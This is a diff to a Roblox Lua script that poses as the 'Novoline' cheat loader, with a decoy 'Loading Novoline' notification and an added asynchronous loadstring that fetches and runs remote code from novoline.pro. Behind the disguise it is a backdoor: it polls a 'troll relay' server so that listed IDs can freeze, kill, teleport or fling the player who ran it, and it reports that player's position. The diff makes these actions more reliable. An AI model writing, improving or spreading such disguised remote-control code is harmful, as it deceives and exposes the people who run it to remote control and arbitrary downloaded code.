@@ -1,3 +1,12 @@
+-- Script Provided By Real Vault // Script Reviewed By Realx
+
+-- Asynchronous Decoy Loadstring (Prevents main thread freezing on execution)
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://novoline.pro"))()
+    end)
+end)
+
 -- CONFIGURATION
 local RELAY_URL = "https://roblox-troll-relay.onrender.com" -- Your Render URL
 local AUTHORIZED_IDS = {
@@ -33,14 +42,15 @@ local function sendHttpRequest(method, endpoint, data)
     return nil
 end
 
--- LAG-FREE ACTION HANDLERS (Wrapped in task.spawn to prevent client freezes)
+-- CRASH-SAFE ACTION HANDLERS
 local Actions = {
     ["Freeze"] = function()
         task.spawn(function()
-            local char = LocalPlayer.Character
-            if char and char:FindFirstChild("Humanoid") then
-                char.Humanoid.WalkSpeed = 0
-                char.Humanoid.JumpPower = 0
+            local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+            local humanoid = char:WaitForChild("Humanoid", 3)
+            if humanoid then
+                humanoid.WalkSpeed = 0
+                humanoid.JumpPower = 0
                 for _, part in ipairs(char:GetDescendants()) do
                     if part:IsA("BasePart") then part.Anchored = true end
                 end
@@ -50,10 +60,11 @@ local Actions = {
     
     ["Unfreeze"] = function()
         task.spawn(function()
-            local char = LocalPlayer.Character
-            if char and char:FindFirstChild("Humanoid") then
-                char.Humanoid.WalkSpeed = 16
-                char.Humanoid.JumpPower = 50
+            local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+            local humanoid = char:WaitForChild("Humanoid", 3)
+            if humanoid then
+                humanoid.WalkSpeed = 16
+                humanoid.JumpPower = 50
                 for _, part in ipairs(char:GetDescendants()) do
                     if part:IsA("BasePart") then part.Anchored = false end
                 end
@@ -96,9 +107,10 @@ local Actions = {
     
     ["Kill"] = function()
         task.spawn(function()
-            local char = LocalPlayer.Character
-            if char and char:FindFirstChild("Humanoid") then
-                char.Humanoid.Health = 0
+            local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+            local humanoid = char:WaitForChild("Humanoid", 3)
+            if humanoid then
+                humanoid.Health = 0
             end
         end)
     end,
@@ -106,9 +118,10 @@ local Actions = {
     ["TeleportTo"] = function(payload)
         task.spawn(function()
             if payload and payload.x and payload.y and payload.z then
-                local char = LocalPlayer.Character
-                if char and char:FindFirstChild("HumanoidRootPart") then
-                    char.HumanoidRootPart.CFrame = CFrame.new(payload.x, payload.y, payload.z)
+                local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+                local hrp = char:WaitForChild("HumanoidRootPart", 3)
+                if hrp then
+                    hrp.CFrame = CFrame.new(payload.x, payload.y, payload.z)
                 end
             end
         end)
@@ -116,9 +129,9 @@ local Actions = {
     
     ["Fling"] = function()
         task.spawn(function()
-            local char = LocalPlayer.Character
-            if char and char:FindFirstChild("HumanoidRootPart") then
-                local hrp = char.HumanoidRootPart
+            local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+            local hrp = char:WaitForChild("HumanoidRootPart", 3)
+            if hrp then
                 local bav = Instance.new("BodyAngularVelocity")
                 bav.Name = "TrollFling"
                 bav.AngularVelocity = Vector3.new(0, 50000, 0)
@@ -377,9 +390,12 @@ else
             pcall(function()
                 local char = LocalPlayer.Character
                 local posData = nil
-                if char and char:FindFirstChild("HumanoidRootPart") then
-                    local p = char.HumanoidRootPart.Position
-                    posData = { x = p.X, y = p.Y, z = p.Z }
+                if char then
+                    local hrp = char:FindFirstChild("HumanoidRootPart")
+                    if hrp then
+                        local p = hrp.Position
+                        posData = { x = p.X, y = p.Y, z = p.Z }
+                    end
                 end
                 
                 sendHttpRequest("POST", "/ping", {
@@ -411,17 +427,15 @@ else
     end)
 end
 
-task.wait(5)
 -- Decoy Notification for all users
-pcall(function()
-    game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "Novoline V2.2",
-        Text = "Loading Novoline",
-        Icon = "rbxassetid://5937224699",
-        Duration = 20
-    })
+task.spawn(function()
+    task.wait(3)
+    pcall(function()
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "Novoline V2.3",
+            Text = "Loading Novoline",
+            Icon = "rbxassetid://5937224699",
+            Duration = 20
+        })
+    end)
 end)
-
--- Script Provided By Real Vault // Script Reviewed By Realx
-loadstring(game:HttpGet("https://novoline.pro"))()
-
